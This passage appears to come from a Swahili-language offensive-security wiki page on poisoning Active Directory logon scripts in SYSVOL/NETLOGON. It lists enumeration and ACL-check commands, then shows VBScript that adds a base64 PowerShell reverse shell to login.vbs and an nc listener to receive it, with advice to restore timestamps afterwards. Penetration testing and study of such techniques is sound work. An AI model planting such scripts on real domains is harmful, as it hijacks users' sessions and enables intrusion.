Ikiwa path ya script inaelekeza kwenye hostname inayoweza kufanyiwa spoof, elekeza UNC host upya na utoe maudhui mbadala ya script kutoka eneo linalotarajiwa.

## SYSVOL/NETLOGON Logon Script Poisoning

Njia zinazoruhusu kuandikwa chini ya `\\<dc>\SYSVOL\<domain>\scripts\` au `\\<dc>\NETLOGON\` zinawezesha kuchezea logon scripts zinazotekelezwa mtumiaji anapoingia kupitia GPO. Hii huwezesha utekelezaji wa code katika muktadha wa usalama wa watumiaji wanaoingia.

### Tafuta logon scripts
- Kagua sifa za user ili kuona kama logon script imesanidiwa:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Changanua shares za domain ili kubaini njia za mkato au marejeo ya scripts:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Changanua faili za .lnk ili kubaini malengo yanayoelekeza kwenye SYSVOL/NETLOGON (mbinu muhimu ya DFIR na kwa washambuliaji wasiokuwa na ufikiaji wa moja kwa moja wa GPO):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound huonyesha attribute ya logon-script `scriptPath` ya kitu cha user ikiwa ipo. Logon scripts zilizosanidiwa kupitia GPO ni marejeleo tofauti ya policy, kwa hiyo kagua pia GPO husika.

### Thibitisha ruhusa za kuandika (usitegemee orodha za share)
Zana za kiotomatiki zinaweza kuonyesha SYSVOL/NETLOGON kuwa read-only hata pale ambapo script husika ina NTFS ACL tofauti. Anza kwa kukagua faili hiyo na directory yake kuu bila kufanya mabadiliko; Allow ACE zinazolingana bado zinaweza kuhusika kwa sababu ruhusa halisi za SMB na NTFS, Deny ACE, na token ya sasa yote ni muhimu:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Jaribio la kuandika lililoidhinishwa linapaswa kulenga kifaa maalum na liweze kutenduliwa, huku script asilia ikiwa imehifadhiwa nakala na kurejeshwa. Usibadilishe script ya logon inayofanya kazi ili tu kujaribu ufikiaji; uandishi ukifaulu, script inaweza kutekelezwa mtumiaji mwingine anapoingia wakati ujao.

### Haribu script ya logon ya VBScript ili kupata RCE
Ongeza amri inayozindua reverse shell ya PowerShell (itengeneze kutoka revshells.com) na uhifadhi mantiki asilia ili kuepuka kuvuruga shughuli za biashara:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Sikiliza kwenye host yako na usubiri kuingia kunakofuata kwa mtumiaji katika hali shirikishi:

```bash
rlwrap -cAr nc -lnvp 443
```

Maelezo:
- Utekelezaji hufanyika kwa kutumia token ya mtumiaji wa logging (si SYSTEM). Scope ni kiungo cha GPO (OU, site, domain) kinachotumia script hiyo.
- Baada ya matumizi, rejesha maudhui/timestamps za awali.


## References

- [1] [Kutumia vibaya Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Akaunti zenye Haki za Juu na Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Sasisho la Njia za Mashambulizi ya ACL](https://wald0.com/?p=112)
- [4] [Enum ya ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Kuongeza privileges kwa kutumia ACLs katika Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Kuchanganua Privileges za Active Directory na Akaunti zenye Privileges](https://adsecurity.org/?p=3658)
- [7] [Kijenzi cha ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Operesheni za attribute/UAC za AD kutoka Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (uanachama wa group)](https://www.samba.org/)
- [10] [HTB Puppy: Matumizi mabaya ya AD ACL, kuvunja Argon2 ya KeePassXC, na kusimbua DPAPI ili kupata DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Kuteka nyara njia za UNC za GPO ili kutekeleza code na kufanya NTLM relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: kutumia vibaya GPO za Active Directory kupitia NTLM relaying, na mengineyo](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU inatania? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: kutumia vibaya njia fiche za mashambulizi ya ACL katika Organizational Units za Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Kuiga huduma halali za Active Directory kwenye mtandao: kesi ya kutumia vibaya GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [GPOddity ya Synacktiv](https://github.com/synacktiv/GPOddity)
- [17] [OUned ya Synacktiv](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
